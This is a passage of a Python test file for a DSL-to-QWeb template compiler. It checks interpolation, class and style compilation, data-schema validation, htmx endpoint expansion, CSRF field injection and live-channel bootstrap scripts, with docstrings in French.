        brut, aucune ambiguïté structurelle)."""
        from xdsl.parser import ParseError

        with pytest.raises(ParseError):
            compile('''
                import { badge } from "xweb"
                component test { badge { label: names | join:', ',city } }
            ''')


# =============================================================================
# _to_qweb_interp — conversion ${expr} → {{expr}}
# =============================================================================


class TestToQwebInterp:
    def test_passthrough_without_interpolation(self):
        assert _to_qweb_interp("on click toggle .hidden") == "on click toggle .hidden"
        assert _to_qweb_interp("plain {js} text") == "plain {js} text"
        assert _to_qweb_interp("") == ""

    def test_simple(self):
        assert _to_qweb_interp("put ${user.name} into me") == "put {{user.name}} into me"

    def test_multiple(self):
        assert _to_qweb_interp("${a} et ${b}") == "{{a}} et {{b}}"

    def test_nested_braces(self):
        """${JSON.stringify({a: 1})} reste un seul groupe d'interpolation."""
        result = _to_qweb_interp("on click put ${JSON.stringify({a: 1})} into me")
        assert result == "on click put {{JSON.stringify({a: 1})}} into me"

    def test_whitespace_stripped(self):
        assert _to_qweb_interp("log ${ user.id }") == "log {{user.id}}"

    def test_unclosed_interpolation_untouched(self):
        """${ non fermé (pas de } avant la fin) n'est pas converti."""
        result = _to_qweb_interp("log ${user.id")
        assert result == "log ${user.id"


# =========================================================================
# Tests : liste de classes et dict de style — compilateur
# =========================================================================


class TestClassListCompilation:
    """Compilation de class: [...] → t-attf-class / t-attf-extra_class."""

    def test_static_class_list_element(self):
        xml = _compile_one('div { class: ["flex", "items-center"] }')
        assert 't-attf-class="flex items-center"' in xml

    def test_mixed_class_list_element(self):
        xml = _compile_one('div { class: ["btn", pressed] }')
        assert 't-attf-class="btn {{pressed}}"' in xml

    def test_interpolated_class_list_element(self):
        xml = _compile_one('div { class: ["${size}-gap"] }')
        assert 't-attf-class="{{size}}-gap"' in xml

    def test_static_class_list_on_component_call(self):
        xml = _compile_one('''import { Button } from "xweb"
component A { Button { class: ["btn", "primary"] } }''')
        assert 't-attf-extra_class="btn primary"' in xml

    def test_mixed_class_list_on_component_call(self):
        xml = _compile_one('''import { Button } from "xweb"
component A { Button { class: ["btn", active] } }''')
        assert 't-attf-extra_class="btn {{active}}"' in xml


class TestStyleDictCompilation:
    """Compilation de style: { prop: value } → style= / t-att-style."""

    def test_static_style_dict(self):
        xml = _compile_one('div { style: { color: "red" padding: "2rem" } }')
        assert 'style="color: red; padding: 2rem;"' in xml

    def test_dynamic_style_dict(self):
        xml = _compile_one('div { style: { opacity: expr } }')
        assert 't-att-style="&apos;opacity: &apos; + (expr) + &apos;;&apos;"' in xml

    def test_mixed_style_dict(self):
        xml = _compile_one('div { style: { color: "red" opacity: expr } }')
        assert 't-att-style="' in xml
        assert "&apos;color: &apos;" in xml
        assert "&apos;red&apos;" in xml
        assert "(expr)" in xml

    def test_interpolation_in_style_dict(self):
        xml = _compile_one('div { style: { color: "${theme}" } }')
        assert "(theme)" in xml

    def test_old_string_style_unchanged(self):
        """style: "..." (string) produit toujours un attribut HTML direct."""
        xml = _compile_one('div { style: "color: red" }')
        assert 'style="color: red"' in xml
        assert 't-attf-' not in xml
        assert 't-att-style=' not in xml


class TestBuildPythonConcat:
    """_build_python_concat: conversion ${expr} → expression Python."""

    def test_literal(self):
        from xdsl.compiler import _build_python_concat
        assert _build_python_concat("red") == "'red'"

    def test_single_interpolation(self):
        from xdsl.compiler import _build_python_concat
        assert _build_python_concat("${x}") == "(x)"

    def test_mixed_literal_and_interpolation(self):
        from xdsl.compiler import _build_python_concat
        assert _build_python_concat("abc${x}def") == "'abc' + (x) + 'def'"

    def test_interpolation_at_start(self):
        from xdsl.compiler import _build_python_concat
        assert _build_python_concat("${x}def") == "(x) + 'def'"

    def test_multiple_interpolations(self):
        from xdsl.compiler import _build_python_concat
        assert _build_python_concat("${a}-${b}") == "(a) + '-' + (b)"


class TestDottedComponentCall:
    """Composant défini localement appelé par son nom qualifié (doc "Slots")."""

    def test_local_dotted_call(self):
        xml = _compile_one('''component auth.login { div { "Login" } }
component auth { auth.login { } }
''')
        assert_xml_contains(xml, '<t t-call="auth.login"/>')

    def test_local_dotted_call_with_props(self):
        xml = _compile_one('''component auth.login { span { "Login" } }
component auth { auth.login { variant: "primary" } }
''')
        assert_xml_contains(xml, '<t t-call="auth.login" t-att-variant="\'primary\'"/>')

    def test_import_still_wins_over_local(self):
        """Le scope d'import prime sur le t-name local."""
        xml = _compile_one('''import { card } from "xweb"
component xweb.card { div { "local" } }
component other { xweb.card { } }
''')
        # xweb.card non importé → résolu en t-name local
        assert_xml_contains(xml, '<t t-call="xweb.card"/>')

    def test_unknown_dotted_remains_raw_element(self):
        """Un tag dotted non résolu reste un élément brut (web component idéalement)."""
        xml = _compile_one('component other { my.widget { class: "x" } }')
        assert_xml_contains(xml, '<my.widget class="x"/>')


class TestDslToEngineEndToEnd:
    """Pipeline complet : DSL (class:/style:) → XML QWeb → rendu moteur xweb."""

    def _render(self, source: str, ctx: dict) -> str:
        xml = compile(textwrap.dedent(source))
        reg = QwebRegistry()
        reg.register_source("<templates>" + xml + "</templates>", source_plugin="__plugin__")
        return reg.render("Card", ctx)

    def test_class_list_and_style_dict_rendered(self):
        html = self._render(
            """component Card {
    div {
        class: ["flex", "items-center", live_class]
        style: {
            color: "${'a' if is_urgent else 'b'}"
            padding: "2rem"
        }
    }
}
""",
            {"live_class": "shadow", "is_urgent": False},
        )
        assert 'class="flex items-center shadow"' in html
        assert 'style="color: b; padding: 2rem;"' in html

    def test_style_dict_conditional_python(self):
        html = self._render(
            """component Card {
    div { style: { color: "${'a' if is_urgent else 'b'}" } }
}
""",
            {"is_urgent": True},
        )
        assert 'style="color: a;"' in html

    def test_class_list_with_interpolation_rendered(self):
        html = self._render(
            """component Card {
    div { class: ["${size}-gap"] }
}
""",
            {"size": "6"},
        )
        assert 'class="6-gap"' in html


# =============================================================================
# `data` / `endpoint` / `use:` — requêtes réseau déclaratives
# (docs/dsl-design.md#requêtes-réseau)
# =============================================================================


def _render_with_components(source: str, template: str, ctx: dict | None = None) -> str:
    """Compile *source*, l'enregistre à côté du vrai catalogue
    xweb/components/ (endpoints -> toast/form/button/csrf réels), rend
    *template*."""
    xml = compile(textwrap.dedent(source))
    reg = QwebRegistry()
    reg.register_dir(Path(__file__).parent.parent.parent / "xweb" / "components")
    reg.register_source(xml, filename="<test>")
    return reg.render(template, ctx or {})


class TestDataSchema:
    def test_field_decorators_captured_with_args(self):
        ast = Parser(
            textwrap.dedent("""
                data contact_form {
                    name: string @required @min_length(3)
                    age: int @min(0) @max(120)
                }
            """)
        ).parse()
        schema = ast.data_schemas[0]
        assert schema.name == "contact_form"
        name_field = schema.fields[0]
        assert name_field.value_type == "string"
        assert name_field.decorators == [("required", []), ("min_length", [3])]
        age_field = schema.fields[1]
        assert age_field.decorators == [("min", [0]), ("max", [120])]

    def test_field_without_required_has_no_decorators(self):
        ast = Parser("data d { phone: string }").parse()
        assert ast.data_schemas[0].fields[0].decorators == []

    def test_list_decorator_arg(self):
        ast = Parser('data d { role: string @in(["admin", "editor"]) }').parse()
        assert ast.data_schemas[0].fields[0].decorators == [("in", [["admin", "editor"]])]


class TestExtractSchemas:
    """xdsl.api.extract_schemas — le pont vers la validation SERVEUR
    (xdsl/validators.py), la seule qui compte pour des données reçues."""

    def test_schema_validates_against_real_validators(self):
        from xdsl.api import extract_schemas
        from xdsl.validators import validate_dict

        schemas = extract_schemas("""
            data contact_form {
                name: string @required @min_length(3)
                email: string @required @email
            }
        """)
        assert validate_dict({"name": "Al", "email": "bad"}, schemas["contact_form"]) == {
            "name": ["Minimum 3 caractères"],
            "email": ["Adresse email invalide"],
        }
        assert validate_dict(
            {"name": "Alice", "email": "alice@example.com"}, schemas["contact_form"]
        ) == {}

    def test_unknown_decorator_raises_at_extraction_not_silently(self):
        from xdsl.api import extract_schemas

        with pytest.raises(ValueError, match="inconnue"):
            extract_schemas("data d { x: string @not_a_real_rule }")


class TestUseEndpoint:
    """`use: nom` sur un élément — expansion en hx-*/_hyperscript."""

    def test_unknown_endpoint_raises_compile_error(self):
        from xdsl.compiler import CompileError

        with pytest.raises(CompileError, match="save_contact"):
            compile('component test { form { use: save_contact } }')

    def test_method_and_url_become_hx_attribute(self):
        xml = _compile_one("""
            endpoint save_contact { method: POST  url: "/api/contacts" }
            form { use: save_contact }
        """)
        assert_xml_contains(xml, 'hx-post="/api/contacts"')

    def test_get_endpoint_uses_hx_get(self):
        xml = _compile_one("""
            endpoint list_contacts { method: GET  url: "/api/contacts" }
            div { use: list_contacts }
        """)
        assert_xml_contains(xml, 'hx-get="/api/contacts"')

    def test_headers_become_json_hx_headers(self):
        xml = _compile_one("""
            endpoint save_contact {
                method: POST  url: "/x"
                headers: { "Content-Type": "application/json" }
            }
            form { use: save_contact }
        """)
        assert "hx-headers=" in xml
        assert "Content-Type" in xml
        assert "application/json" in xml

    def test_json_endpoint_sets_hx_swap_none(self):
        """Régression : sans hx-swap="none", htmx applique son
        comportement par défaut (remplacer l'innerHTML de l'élément
        déclencheur par le corps brut de la réponse) — le texte JSON
        écraserait le formulaire lui-même."""
        xml = _compile_one("""
            endpoint save_contact { method: POST  url: "/x" }
            form { use: save_contact }
        """)
        assert_xml_contains(xml, 'hx-swap="none"')

    def test_no_onloading_means_no_hx_indicator(self):
        xml = _compile_one("""
            endpoint save_contact { method: POST  url: "/x" }
            form { use: save_contact }
        """)
        assert "hx-indicator" not in xml

    def test_onloading_generates_hx_indicator_and_hidden_scaffolding(self):
        xml = _compile_one("""
            endpoint save_contact {
                method: POST  url: "/x"
                onloading { p { "Envoi..." } }
            }
            form { use: save_contact }
        """)
        assert_xml_contains(xml, 'hx-indicator="#save_contact-1-indicator"')
        assert_xml_contains(xml, '<div id="save_contact-1-indicator" class="htmx-indicator">')
        assert "Envoi..." in xml

    def test_two_uses_of_the_same_endpoint_get_distinct_ids(self):
        """Deux éléments utilisant le même endpoint ne doivent jamais
        collisionner sur le même id DOM — même piège que le défaut fixe
        de xweb.popover/popup/datepicker (voir ces fichiers)."""
        xml = _compile_one("""
            endpoint save_contact {
                method: POST  url: "/x"
                onsuccess { p { "OK" } }
            }
            form { use: save_contact }
            form { use: save_contact }
        """)
        assert "save_contact-1-onsuccess" in xml
        assert "save_contact-2-onsuccess" in xml


class TestChannel:
    """`channel { }` / `use_channel: nom` — bootstrap JS déclaratif pour
    xweb/static/live_channel.js (voir docstring de ce fichier pour le
    contrat runtime : onMessage(channel, data))."""

    def test_unknown_channel_raises_compile_error(self):
        from xdsl.compiler import CompileError

        with pytest.raises(CompileError, match="contacts_feed"):
            compile('component test { div { use_channel: contacts_feed } }')

    def test_use_channel_attribute_does_not_leak_onto_the_element(self):
        xml = _compile_one("""
            channel c { url: "/stream" }
            div { use_channel: c }
        """)
        assert "use_channel" not in xml

    def test_bootstrap_script_carries_url_channels_transport(self):
        xml = _compile_one("""
            channel contacts_feed {
                url: "/stream"
                channels: ["chat", "notif"]
                transport: "sse"
            }
            div { use_channel: contacts_feed }
        """)
        assert "<script>" in xml
        assert "XwebLiveChannel" in xml
        assert "/stream" in xml
        assert "chat" in xml and "notif" in xml
        assert "sse" in xml

    def test_connect_timeout_ms_included_only_when_set(self):
        with_timeout = _compile_one("""
            channel c { url: "/x"  connect_timeout_ms: 5000 }
            div { use_channel: c }
        """)
        assert "connectTimeoutMs" in with_timeout
        assert "5000" in with_timeout

        without_timeout = _compile_one("""
            channel c { url: "/x" }
            div { use_channel: c }
        """)
        assert "connectTimeoutMs" not in without_timeout

    def test_onmessage_bind_writes_textcontent(self):
        xml = _compile_one("""
            channel c {
                url: "/x"
                onmessage { bind: { "#counter": "count" } }
            }
            div { use_channel: c }
        """)
        assert "#counter" in xml
        assert "count" in xml
        assert "textContent" in xml

    def test_onmessage_refresh_triggers_htmx(self):
        xml = _compile_one("""
            channel c {
                url: "/x"
                onmessage { refresh: "#contacts-table"  event: "contacts:changed" }
            }
            div { use_channel: c }
        """)
        assert "#contacts-table" in xml
        assert "htmx.trigger" in xml
        assert "contacts:changed" in xml

    def test_onmessage_refresh_without_event_defaults_to_channel_message_event(self):
        xml = _compile_one("""
            channel c {
                url: "/x"
                onmessage { refresh: "#t" }
            }
            div { use_channel: c }
        """)
        assert "c:message" in xml

    def test_persist_calls_xwebstorage_set(self):
        xml = _compile_one("""
            channel c {
                url: "/x"
                persist: "last_contact"
            }
            div { use_channel: c }
        """)
        assert "XwebStorage" in xml
        assert "last_contact" in xml

    def test_validate_guards_onmessage_with_xwebvalidate(self):
        xml = _compile_one("""
            data contact_form { name: string @required @min_length(3) }
            channel c {
                url: "/x"
                validate: "contact_form"
            }
            div { use_channel: c }
        """)
        assert "XwebValidate" in xml
        assert "contact_form" in xml

    def test_validate_exports_schema_as_json_for_client_side_validation(self):
        """`validate:` doit rendre le schéma `data` réel disponible au
        client (window.XWEB_SCHEMAS), pas juste le référencer par nom —
        sans ça xweb/static/validators.js n'aurait rien à lire."""
        xml = _compile_one("""
            data contact_form {
                name: string @required @min_length(3)
                email: string @required @email
            }
            channel c {
                url: "/x"
                validate: "contact_form"
            }
            div { use_channel: c }
        """)
        assert "XWEB_SCHEMAS" in xml
        assert "required" in xml
        assert "min_length" in xml
        assert "email" in xml

    def test_validate_referencing_unknown_data_schema_raises_compile_error(self):
        from xdsl.compiler import CompileError

        with pytest.raises(CompileError, match="contact_form"):
            compile("""
                channel c { url: "/x"  validate: "contact_form" }
                div { use_channel: c }
            """)

    def test_no_validate_means_no_xwebvalidate_call(self):
        xml = _compile_one("""
            channel c { url: "/x" }
            div { use_channel: c }
        """)
        assert "XwebValidate" not in xml

    def test_dispatch_true_emits_custom_event_with_default_name(self):
        """`dispatch: true` est la porte de sortie vers du hyperscript/JS
        arbitraire — un CustomEvent DOM réel sur document, capturable par
        `_: on {nom}:message from document ...` n'importe où dans la
        page, sans que `onmessage {}` lui-même devienne du code libre."""
        xml = _compile_one("""
            channel contacts_feed {
                url: "/x"
                onmessage { dispatch: true }
            }
            div { use_channel: contacts_feed }
        """)
        assert "document.dispatchEvent" in xml
        assert "CustomEvent" in xml
        assert "contacts_feed:message" in xml
        assert "detail" in xml and "channel" in xml and "data" in xml

    def test_dispatch_true_with_explicit_event_name(self):
        xml = _compile_one("""
            channel c {
                url: "/x"
                onmessage { dispatch: true  event: "contacts:changed" }
            }
            div { use_channel: c }
        """)
        assert "contacts:changed" in xml
        assert "c:message" not in xml

    def test_dispatch_defaults_to_false_no_customevent_emitted(self):
        xml = _compile_one("""
            channel c { url: "/x"  onmessage { refresh: "#t" } }
            div { use_channel: c }
        """)
        assert "dispatchEvent" not in xml
        assert "CustomEvent" not in xml

    def test_dispatch_and_refresh_share_the_same_event_name(self):
        """refresh: (htmx.trigger) et dispatch: (CustomEvent DOM) portent
        le même nom d'événement quand les deux sont posés — un seul champ
        `event:` pour les deux, pas une clé par mécanisme."""
        xml = _compile_one("""
            channel c {
                url: "/x"
                onmessage { refresh: "#t"  dispatch: true  event: "shared:name" }
            }
            div { use_channel: c }
        """)
        assert xml.count("shared:name") == 2  # htmx.trigger(...) ET CustomEvent(...)


class TestChannelEndToEnd:
    """Preuve bout-en-bout (vrai QwebRegistry, vrai rendu) que le
    bootstrap `<script>` généré par `use_channel:` arrive intact dans le
    HTML final — même niveau de preuve que TestCopyEndToEnd (les bugs de
    copy/patch de cette session ne se voyaient qu'à ce niveau, jamais sur
    du texte XML comparé à la main)."""

    def _render(self, source: str, template: str = "test") -> str:
        xml = compile(textwrap.dedent(source))
        reg = QwebRegistry()
        reg.register_source(f"<templates>\n{xml}\n</templates>", filename="<test>")
        return reg.render(template, {})

    def test_script_survives_real_rendering_unescaped(self):
        """_RAW_TEXT_TAGS (engine/compiler.py) doit laisser le JS intact
        dans <script> — pas de &quot;/&amp; qui traîneraient dans le HTML
        servi au navigateur."""
        html = self._render("""
            channel contacts_feed {
                url: "/stream"
                channels: ["chat"]
                transport: "sse"
                onmessage { bind: { "#counter": "count" } }
            }
            component test {
                div { use_channel: contacts_feed
                    span { id: "counter"  "0" }
                }
            }
        """)
        assert "<script>" in html
        assert "&quot;" not in html
        assert "&amp;&amp;" not in html
        assert 'var _xwebChannelOpts = {"url": "/stream"' in html
        assert 'document.querySelector("#counter")' in html

    def test_use_channel_attribute_absent_from_rendered_html(self):
        html = self._render("""
            channel c { url: "/x" }
            component test {
                div {
                    use_channel: c
                    "hello"
                }
            }
        """)
        assert "use_channel" not in html
        assert "hello" in html

    def test_form_with_post_method_auto_injects_csrf_field(self):
        xml = _compile_one("""
            endpoint save_contact { method: POST  url: "/x" }
            form { use: save_contact }
        """)
        assert_xml_contains(xml, '<t t-call="xweb.csrf" t-att-token="csrf_token"/>')

    def test_get_method_does_not_inject_csrf_field(self):
        xml = _compile_one("""
            endpoint list_contacts { method: GET  url: "/x" }
            form { use: list_contacts }
        """)
        assert_xml_not_contains(xml, "xweb.csrf")

    def test_non_form_element_never_injects_csrf_field(self):
        xml = _compile_one("""
            endpoint save_contact { method: POST  url: "/x" }
            button { use: save_contact }
        """)
        assert_xml_not_contains(xml, "xweb.csrf")

    def test_use_on_xweb_form_t_call_forwards_token_prop_instead_of_child(self):
        """xweb.form pose déjà son propre csrf_token en interne
        (xweb/components/form.xml) — use: doit lui transmettre le jeton
        via la prop `token`, jamais injecter un enfant xweb.csrf en plus
        (double champ csrf_token, confus pour un formulaire soumis)."""
        xml = compile("""
            endpoint save_contact { method: POST  url: "/x" }
            import { form } from "xweb"
            component test {
                form { use: save_contact }
            }
        """)
        assert_xml_contains(xml, 't-att-token="csrf_token"')
        assert "xweb.csrf" not in xml

    def test_receive_target_sends_event_on_success(self):
        xml = _compile_one("""
            endpoint save_contact {
                method: POST  url: "/x"
                receive { target: "#contact-table"  event: "save_contact:done" }
            }
            form { use: save_contact }
        """)
        assert "send save_contact:done to #contact-table" in xml

    def test_receive_target_without_explicit_event_defaults_to_endpoint_name_done(self):
        xml = _compile_one("""
            endpoint save_contact {
                method: POST  url: "/x"
                receive { target: "#contact-table" }
            }
            form { use: save_contact }
        """)
        assert "send save_contact:done to #contact-table" in xml

    def test_end_to_end_render_success_and_error_reveal(self):
        """Bout en bout, comme les tests de TestDslToEngineEndToEnd : le
        XML compilé doit vraiment se rendre (pas seulement contenir les
        bons mots-clés) — csrf réel, toast réel, blocs cachés réels."""
        html = _render_with_components(
            """
            import { toast } from "xweb"
            endpoint save_contact {
                method: POST
                url: "/api/contacts"
                onsuccess { toast { "Contact créé !" } }
                onerror { toast { "Erreur" } }
            }
            component test {
                form { use: save_contact }
            }
            """,
            "test",
            {"csrf_token": "tok"},
        )
        assert 'name="csrf_token" value="tok"' in html
        assert 'id="save_contact-1-onsuccess" hidden="hidden"' in html
        assert 'id="save_contact-1-onerror" hidden="hidden"' in html
        assert "Contact créé !" in html
        assert "Erreur" in html